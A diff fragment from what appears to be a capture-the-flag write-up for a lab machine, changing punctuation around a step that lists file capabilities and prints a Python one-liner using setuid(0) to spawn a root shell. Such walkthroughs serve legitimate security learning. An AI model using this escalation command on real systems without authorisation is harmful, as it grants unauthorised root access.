@@ -205,7 +205,7 @@ Files with capabilities (limited to 50):
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
-Run the python script and it will give us a root shell and the flag!
+Run the python script and it will give us a root shell and the flag!!
 
 ```console
 nathan@cap:/bin$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
